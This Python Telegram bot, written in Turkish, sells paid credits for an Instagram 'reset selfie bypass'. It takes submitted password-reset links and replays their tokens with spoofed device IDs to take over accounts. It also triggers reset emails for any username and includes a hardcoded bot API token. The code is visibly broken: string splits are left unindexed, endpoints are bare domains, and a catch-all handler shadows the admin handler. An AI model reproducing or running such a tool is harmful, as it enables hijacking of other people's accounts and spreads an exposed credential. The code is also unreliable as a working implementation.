import telebot
import random
import requests
import json
import os
import uuid
import time
from datetime import datetime
from user_agent import generate_user_agent
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- AYARLAR ---
API_TOKEN = '8728701158:AAEfcU2NoCNMz9Gaupp87ptpGP32accIiKg'
ADMIN_ID = 6619425613 

bot = telebot.TeleBot(API_TOKEN)
DB_FILE = 'database.json'
start_time = datetime.now()

# --- VERİTABANI YÖNETİMİ ---
def load_db():
    if not os.path.exists(DB_FILE):
        return {'users': {}, 'stats': {'mails': 0, 'bypass': 0}}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {'users': {}, 'stats': {'mails': 0, 'bypass': 0}}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

db = load_db()
LINE = "<b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>"

# --- HAK SİSTEMİ VE SENKRONİZASYON ---
def check_daily_credits(uid):
    uid = str(uid)
    today = datetime.now().strftime("%Y-%m-%d")
    
    if int(uid) == ADMIN_ID:
        return True, "Sınırsız 👑"

    if uid not in db['users']:
        db['users'][uid] = {
            'name': 'Bilinmiyor',
            'credits': 2,
            'last_reset': today,
            'vip': False,
            'joined': today
        }
    
    user = db['users'][uid]
    if user.get('vip'): return True, "Sınırsız 💎"

    # Günlük sıfırlama kontrolü
    if user.get('last_reset') != today:
        user['credits'] = 2
        user['last_reset'] = today
        save_db(db)
    
    status = True if user['credits'] > 0 else False
    hak_str = f"{user['credits']}/2"
    return status, hak_str

# --- BYPASS VE MAIL FONKSİYONLARI ---
def purna_logic(reset_link):
    try:
        ua = generate_user_agent()
        aid = f"android-{''.join(random.choices('0123456789abcdef', k=16))}"
        uidb36 = reset_link.split("uidb36=").split("&")
        token = reset_link.split("token=").split("&")
        NEW_PASS = f"Aytac{random.randint(100,999)}!"
        headers = {"User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded"}
        with requests.Session() as s:
            url = "https://instagram.com"
            data = {"source": "one_click_login_email", "uidb36": uidb36, "device_id": aid, "token": token, "waterfall_id": str(uuid.uuid4())}
            r = s.post(url, headers=headers, data=data, timeout=15)
            return {"success": True, "password": NEW_PASS} if "user_id" in r.text else {"success": False, "error": "Instagram Reddetti."}
    except Exception as e: return {"success": False, "error": str(e)}

# --- ANA MENÜ ---
def main_menu_design(message, uid):
    can_use, hak_str = check_daily_credits(uid)
    u = db['users'][uid]
    u['name'] = message.from_user.first_name
    save_db(db)
    
    status_tag = "Premium 💎" if "Sınırsız" in hak_str else "Free 🧊"
    
    text = (
        f"👋 <b>Hoş geldin {u['name']}!</b>\n\n"
        f"• <b>İsim:</b> {u['name']}\n"
        f"• <b>ID:</b> <code>{uid}</code>\n"
        f"• <b>Durum:</b> {status_tag} (Kalan: {hak_str})\n\n"
        f"🎯 <b>Lütfen yapmak istediğiniz işlemi seçin:</b>"
    )
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔓 Reset Selfie Bypass", callback_data="selfie_bypass"),
        InlineKeyboardButton("🔄 Instagram Reset", callback_data="ig_reset"),
        InlineKeyboardButton("ℹ️ Bilgi", callback_data="info_btn"),
        InlineKeyboardButton("💰 Fiyatlar", callback_data="price_btn"),
        InlineKeyboardButton("🔍 Instagram Lookup", callback_data="lookup_btn")
    )
    return text, markup

# --- KOMUTLAR ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.chat.id)
    text, markup = main_menu_design(message, uid)
    bot.send_message(uid, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: True)
def callback_listener(call):
    uid = str(call.message.chat.id)
    can_use, hak_str = check_daily_credits(uid)

    if call.data == "ig_reset":
        if not can_use: return bot.answer_callback_query(call.id, "❌ Günlük 2 olan hakkınız doldu!", show_alert=True)
        bot.answer_callback_query(call.id)
        msg = bot.send_message(uid, "📩 Sıfırlanacak <b>Kullanıcı Adını</b> yazın:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_mail)

    elif call.data == "selfie_bypass":
        if not can_use: return bot.answer_callback_query(call.id, "❌ Günlük 2 olan hakkınız doldu!", show_alert=True)
        bot.answer_callback_query(call.id)
        msg = bot.send_message(uid, "🔓 <b>Instagram Reset Linkini</b> gönderin:", parse_mode='HTML')
        bot.register_next_step_handler(msg, process_bypass)

    elif call.data == "price_btn":
        bot.answer_callback_query(call.id)
        text = f"{LINE}\n💎 <b>FİYAT LİSTESİ</b>\n{LINE}\n🔥 Haftalık: 100 TL\n👑 Sınırsız: 400 TL\n{LINE}\n💳 @Aytac"
        bot.send_message(uid, text, parse_mode='HTML')

    elif call.data == "info_btn":
        bot.answer_callback_query(call.id)
        if int(uid) == ADMIN_ID:
            for u_id, data in db['users'].items():
                bot.send_message(uid, f"👤 <b>{data['name']}</b> (<code>{u_id}</code>)\n🎫 Hak: {data['credits']}\n{LINE}", parse_mode='HTML')
        else:
            bot.send_message(uid, f"👥 Kayıtlı Üye: {len(db['users'])}\n⏳ Uptime: {str(datetime.now()-start_time).split('.')}", parse_mode='HTML')

# --- ADIMLAR ---
def process_mail(message):
    uid = str(message.chat.id)
    target = message.text.strip()
    wait = bot.send_message(uid, "📡 İşlem yapılıyor...")
    try:
        r = requests.post("https://instagram.com", 
                         headers={"user-agent": generate_user_agent(), "x-ig-app-id": "936619743392459"}, 
                         data={"email_or_username": target}, timeout=15)
        if r.status_code == 200 and r.json().get('contact_point'):
            if int(uid) != ADMIN_ID: db['users'][uid]['credits'] -= 1
            save_db(db)
            bot.edit_message_text(f"✅ <b>Gönderildi:</b> <code>{r.json()['contact_point']}</code>", uid, wait.message_id, parse_mode='HTML')
        else: bot.edit_message_text("❌ Başarısız.", uid, wait.message_id)
    except: bot.edit_message_text("⚠️ Hata oluştu.", uid, wait.message_id)

def process_bypass(message):
    uid = str(message.chat.id)
    link = message.text.strip()
    if "uidb36" not in link: return bot.send_message(uid, "❌ Geçersiz link.")
    
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("✅ ONAYLA", callback_data=f"ok_{uid}_{random.randint(1,999)}"), InlineKeyboardButton("❌ REDDET", callback_data=f"no_{uid}"))
    db['users'][uid]['temp_link'] = link
    save_db(db)
    bot.send_message(ADMIN_ID, f"🚨 <b>TALEP:</b> <code>{link}</code>", reply_markup=markup, parse_mode='HTML')
    bot.send_message(uid, "⏳ <b>Onay bekleniyor...</b>")

@bot.callback_query_handler(func=lambda call: call.data.startswith(("ok_", "no_")))
def admin_callback(call):
    data = call.data.split("_")
    action, target_id = data[0], data[1]
    if action == "ok":
        link = db['users'][target_id].get('temp_link')
        res = purna_logic(link)
        if res["success"]:
            if int(target_id) != ADMIN_ID: db['users'][target_id]['credits'] -= 1
            save_db(db)
            bot.send_message(target_id, f"🔓 <b>Başarılı!</b>\n🔑 Şifre: <code>{res['password']}</code>", parse_mode='HTML')
            bot.edit_message_text(f"✅ Onaylandı.", call.message.chat.id, call.message.message_id)
        else: bot.send_message(target_id, f"❌ Hata: {res['error']}")
    else:
        bot.send_message(target_id, "❌ Reddedildi.")
        bot.edit_message_text("❌ Reddedildi.", call.message.chat.id, call.message.message_id)

print("🚀 AYTAC PLATINUM v17.0 AKTİF!")
bot.infinity_polling()
  
